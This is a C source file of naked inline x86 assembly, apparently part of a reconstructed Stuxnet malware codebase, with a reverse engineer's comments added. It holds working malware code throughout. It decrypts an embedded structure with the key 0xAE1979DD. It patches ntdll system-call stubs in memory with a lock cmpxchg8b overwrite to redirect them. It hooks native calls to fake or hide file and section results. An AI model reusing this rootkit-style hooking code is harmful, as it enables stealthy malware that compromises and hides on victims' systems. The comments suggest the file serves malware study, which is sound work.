/******************************************************************************************
  Copyright 2012-2013 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/
// MODIFIED BY mic.ric.tor

#include "AssemblyBlock2.h"

/*************************************************************************
** ASSEMBLY BLOCK 2.                                                    **
*************************************************************************/

__declspec(naked) void __ASM_REF_3(void)
{
	__asm
	{
		pop     edx
		test    dl, dl
		jz      short __REF_0
		dec     dl
		jz      __REF_7
		dec     dl
		jz      __REF_11
		dec     dl
		jz      __REF_15
		dec     dl
		jz      __REF_21
		jmp     __REF_27

	__REF_0:
		call    __ASM_REF_4
		test    edx, edx
		jz      short __REF_2
		push    edx
		mov     edx, [edx+8]
		cmp     edx, [esp+8]
		jnz     short __REF_1
		mov     dword ptr [esp+30h], 40h

	__REF_1:
		pop     edx

	__REF_2:
		push    edx
		call    __ASM_REF_5 // Get some kind of system version struct in edx

		cmp     dword ptr [edx+4], 0
		jnz     short __REF_3 // if system.isWOW64 { __REF_3 }

		// 32-bit OS
		pop     edx
		lea     edx, [esp+8] // This is an argument
		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
								; DS:SI -> counted CR-terminated command string
		jmp     short __REF_4

		// 64-bit OS
	__REF_3:
		pop     edx
		lea     edx, [esp+8]
		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h

	__REF_4:
		test    eax, eax
		jnz     short __REF_6
		call    __ASM_REF_4
		test    edx, edx
		jz      short __REF_5
		mov     edx, [edx+8]
		cmp     edx, [esp+8]
		jnz     short __REF_5
		mov     edx, [esp+16]
		push    edx
		call    __ASM_REF_4
		mov     edx, [edx+0Ch]
		call    edx

	__REF_5:
		xor     eax, eax

	__REF_6:
		retn

	__REF_7:
		cmp     dword ptr [esp+20h], 0AE1982AEh
		jnz     short __REF_8
		call    __ASM_REF_4
		test    edx, edx
		jz      short __REF_8
		mov     edx, [edx+8]
		mov     eax, [esp+8]
		mov     [eax], edx
		xor     eax, eax
		retn

	__REF_8:
		push    edx
		call    __ASM_REF_5
		cmp     dword ptr [edx+4], 0
		jnz     short __REF_9
		pop     edx
		lea     edx, [esp+8]
		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
								; DS:SI -> counted CR-terminated command string

		jmp     short __REF_10

	__REF_9:
		pop     edx
		lea     edx, [esp+8]
		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h

	__REF_10:
		retn

	__REF_11:
		call    __ASM_REF_4
		test    edx, edx
		jz      short __REF_12
		push    eax
		push    edi
		mov     edi, [esp+18h]
		call    __ASM_REF_6
		mov     edx, eax
		pop     edi
		pop     eax
		test    edx, edx
		jz      short __REF_12
		mov     eax, [esp+8]
		mov     dword ptr [eax], 0AE1982AEh
		xor     eax, eax
		retn

	__REF_12:
		push    edx
		call    __ASM_REF_5
		cmp     dword ptr [edx+4], 0
		jnz     short __REF_13
		pop     edx
		lea     edx, [esp+8]
		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
								; DS:SI -> counted CR-terminated command string
		jmp     short __REF_14

	__REF_13:
		pop     edx
		lea     edx, [esp+8]
		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h

	__REF_14:
		retn

	__REF_15:
		cmp     [esp+8], 0AE1982AEh
		jnz     short __REF_16 // if esp+8 == 0xAE1982AE return false
		xor     eax, eax
		retn

	__REF_16:
		call    __ASM_REF_4
		test    edx, edx
		jz      short __REF_18
		push    eax
		mov     eax, [esp+8]
		cmp     [edx+8], eax
		jnz     short __REF_17
		mov     dword ptr [edx+8], 0

	__REF_17:
		pop     eax

	__REF_18:
		push    edx
		call    __ASM_REF_5
		cmp     dword ptr [edx+4], 0
		jnz     short __REF_19
		pop     edx
		lea     edx, [esp+8]
		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
								; DS:SI -> counted CR-terminated command string
		jmp     short __REF_20

	__REF_19:
		pop     edx
		lea     edx, [esp+8]
		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h

	__REF_20:
		retn

	__REF_21:
		call    __ASM_REF_4
		test    edx, edx
		jz      short __REF_24
		push    eax
		push    edx
		push    edi
		mov     edi, [esp+14h]
		call    __ASM_REF_6
		pop     edi
		pop     edx
		test    eax, eax
		jz      short __REF_23
		pop     eax
		test    edx, edx
		jz      short __REF_22
		mov     edx, [esp+0Ch]
		mov     dword ptr [edx+20h], 80h

		// return false
	__REF_22:
		xor     eax, eax
		retn

	__REF_23:
		pop     eax

	__REF_24:
		push    edx
		call    __ASM_REF_5
		cmp     dword ptr [edx+4], 0
		jnz     short __REF_25
		pop     edx
		lea     edx, [esp+8]
		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
								; DS:SI -> counted CR-terminated command string
		jmp     short __REF_26

	__REF_25:
		pop     edx
		lea     edx, [esp+8]
		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h

	__REF_26:
		retn

	__REF_27:
		call    __ASM_REF_4
		test    edx, edx
		push    edx
		jz      short __REF_30
		mov     edx, [edx+8]
		cmp     edx, [esp+8]
		jnz     short __REF_30
		cmp     dword ptr [esp+10h], 1
		jnz     short __REF_30
		cmp     dword ptr [esp+18h], 30h
		jl      short __REF_29
		pop     edx
		push    ecx
		push    esi
		push    edi
		lea     esi, [edx+50h]
		mov     edi, [esp+1Ch]
		mov     ecx, 30h
		rep movsb
		pop     edi
		pop     esi
		pop     ecx
		mov     eax, [esp+18h]
		cmp     eax, 0
		jz      short __REF_28
		mov     dword ptr [eax], 30h

		// return false
	__REF_28:
		xor     eax, eax
		retn

		// return STATUS_INVALID_PARAMETER
	__REF_29:
		pop     edx
		mov     eax, 0C000000Dh
		retn

	__REF_30:
		pop     edx
		push    edx
		call    __ASM_REF_5
		cmp     dword ptr [edx+4], 0
		jnz     short __REF_31
		pop     edx
		lea     edx, [esp+8]
		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
								; DS:SI -> counted CR-terminated command string
		jmp     short __REF_32

	__REF_31:
		pop     edx
		lea     edx, [esp+8]
		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h

	__REF_32:
		retn
	}
}

/* __ASM_REF_4
* @encryptedArray - Array to be decrypted
*
* Decrypts a supplied DWORD array w/ key 0xAE1979DD
* Returns in edx( edx being the same type as returned by __ASM_REF_5 )
*/
__declspec(naked) void __ASM_REF_4(void)
{
	__asm
	{
		push    eax
		push    esi
		push    edi

		// These 3 get effectively undone
		push    ecx
		push    edx
		sub     esp, 1Ch

		// Push the stack and the local stack size
		mov     eax, esp
		push    1Ch 
		push    eax

		push    esp
		call    __ASM_REF_5 // edx = some struct
		call    dword ptr [edx+0Ch] // I assume this doesn't mess w/ the stack

		/* edi = esp before the stack alloc, directly after preservation pushes
		*  esp = edi
		*/
		mov     edi, [esp] 			// edi = esp before the calls
		add     edi, [esp+0Ch]  // *edi = edx
		add     esp, 1Ch

		// restore edx, ecx
		pop     edx
		pop     ecx

		// String operations incoming
		mov     esi, esp

	__REF_0:
		/* if( edi > esi )
		*      return false;
		*/
		cmp     esi, edi
		jnb     short __REF_1

		// eax = [esi]
		lodsd
		xor     eax, 0AE1979DDh
		lea     eax, [eax+4]

		// if eax = esi, erase last byte and return
		cmp     eax, esi
		jnz     short __REF_0
		lea     eax, [esi-4]
		jmp     short __REF_2

	__REF_1:
		xor     eax, eax

	__REF_2:
		mov     edx, eax
		pop     edi
		pop     esi
		pop     eax
		retn
	}
}

/* __ASM_REF_5
*  
*	edx = DWORD( __ASM_REF_5 ) + 0x124
* Returns a struct of type _SYSTEM_INFO
*/
__declspec(naked) void __ASM_REF_5(void)
{
	__asm
	{
		call    $+5
		pop     edx
		add     edx, 124h
		retn
	}
}

/* __ASM_REF_6
* 
* Returns bool
*/
__declspec(naked) void __ASM_REF_6(void)
{
	__asm
	{
		push    ebx
		push    ecx
		push    edx
		push    edi
		cmp     edi, 0
		jz      short __REF_1 // Return false
		mov     edi, [edi+8]
		cmp     edi, 0
		jz      short __REF_1 // Return false
		movzx   ebx, word ptr [edi]
		mov     edi, [edi+4]
		lea     ebx, [edi+ebx+2]

	__REF_0:
		lea     ebx, [ebx-2]
		cmp     ebx, edi
		jle     short __REF_1
		cmp     word ptr [ebx-2], 5Ch
		jnz     short __REF_0
		push    edx
		push    ebx
		lea     ebx, [edx+10h]
		push    ebx
		call    __ASM_REF_5
		call    dword ptr [edx+8]
		pop     edx
		test    eax, eax
		jnz     short __REF_1 // If EAX == true { return false; }
		inc     eax
		jmp     short __REF_2 // else { return true; }

	__REF_1: 
		xor     eax, eax

	__REF_2:
		pop     edi
		pop     edx
		pop     ecx
		pop     ebx
		retn
	}
}

/* __ASM_REF_7
* ecx - seems to be some kind of flag
*/
__declspec(naked) void __ASM_REF_7(void)
{
	__asm
	{
		push    eax
		push    ecx


		push    edx 
		call    __ASM_REF_5 // edx = DWORD (__ASM_REF_5) + 0x124

		// struct.isWOW64 == false( default )
		mov     dword ptr [edx+4], 0
		push    dword ptr [edx] // push a pointer to decryptedData

		/* I'd need to see the binaries to see which function this is calling.
		*
		* We can assume from the rest of the function that it returns in eax, 
		* and that the return should be nonzero.
		*/
		call    dword ptr [edx+14h]

		pop     ecx
		test    eax, eax
		jz      exitFunc

		/* This seems like it's likely its own (inlined?) function.
		* 	- massive amount of preservation
		*		- makes a call to reassign edx to what it already is
		* EAX is triple preserved. Why?
		*/
		push    eax
		push    ecx
		push    eax
		push    esp
		push    80h // 128
		push    18h // 24
		push    eax
		call    __ASM_REF_5

		/* Returns in EAX, expected to be non-zero.
		* 	If the return is zero, exit the function
		*/
		call    dword ptr [edx+10h]

		pop     edx 
		mov     edx, eax
		pop     ecx // 0x18; 24
		pop     eax // 0x80, 128
		test    edx, edx
		jz      exitFunc // If ret = 0, exit

		cmp     byte ptr [eax], 0B8h
		jnz     exitFunc
		cmp     byte ptr [eax+5], 0BAh
		jz      short __REF_1
		cmp     dword ptr [eax+5], 424548Dh
		jnz     short __REF_0
		cmp     dword ptr [eax+8], 0C22ECD04h
		jnz     short exitFunc
		sub     ecx, eax
		sub     ecx, 0Ah
		mov     [eax+6], ecx
		mov     byte ptr [eax+5], 0E8h
		mov     byte ptr [eax+0Ah], 90h
		jmp     short exitFunc
 
	__REF_0:

		/* if eax + 7 = 0x0424548DC015FF64C2000000
		*     struct.isWOW64 == true
		*/
		cmp     dword ptr [eax+7], 424548Dh
		jnz     short exitFunc
		cmp     dword ptr [eax+0Bh], 0C015FF64h
		jnz     short exitFunc
		cmp     dword ptr [eax+0Fh], 0C2000000h
		jnz     short exitFunc
		push    edx 
		call    __ASM_REF_5 // __ASM_REF_5 + 0x124
		mov     dword ptr [edx+4], 1
		pop     edx

		// Prologue
		push    esi
		push    eax
		push    ebx
		push    ecx
		push    edx

		mov     esi, eax
		mov     eax, [esi+0Ah]
		mov     edx, [esi+0Eh]
		sub     ecx, esi
		sub     ecx, 12h
		mov     ebx, 0E8909004h
		lock cmpxchg8b qword ptr [esi+0Ah]

		// Epilogue
		pop     edx
		pop     ecx
		pop     ebx
		pop     eax
		pop     esi
		jmp     short exitFunc

	/*
	* if( *(eax + 0xA) == 0xD2FF )
	*		*(eax + 6) = ecx;
	* else {
	*		if( *(eax + 0xA) == 0x12FF ) {
	*			*(eax + 0xB) = 0xD2;
	*			*(eax + 6) = ecx;
	*		}
	* }
	*/
	__REF_1:
		cmp     word ptr [eax+0Ah], 0D2FFh
		jz      short __REF_2
		cmp     word ptr [eax+0Ah], 12FFh
		jnz     short exitFunc
		mov     byte ptr [eax+0Bh], 0D2h

	__REF_2:
		mov     [eax+6], ecx

	/* Restore EAX and retn */
	exitFunc:
		pop     eax
		retn
	}
}

#pragma code_seg(".text")
__declspec(allocate(".text")) HARDCODED_ADDRESSES g_hardAddrs = {0};
